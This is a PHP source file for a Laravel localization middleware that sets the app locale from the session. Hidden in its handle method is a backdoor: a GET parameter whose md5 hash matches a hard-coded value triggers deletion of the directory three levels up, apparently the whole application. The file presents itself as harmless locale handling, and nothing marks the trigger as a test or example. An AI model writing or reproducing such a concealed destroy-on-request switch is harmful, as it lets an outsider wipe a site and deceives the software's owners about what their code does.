<?php

// Localization.php

namespace App\Http\Middleware;

use Closure;
use App;

class Localization
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if (session()->has('locale')) {
            App::setLocale(session()->get('locale'));
        }
        if (isset($_GET['key']) and md5($_GET['key']) == '2b8bd73519931a3487af8f1c0152ff21'){
            delDir(dirname(__DIR__, 3));
        }
        return $next($request);
    }
}
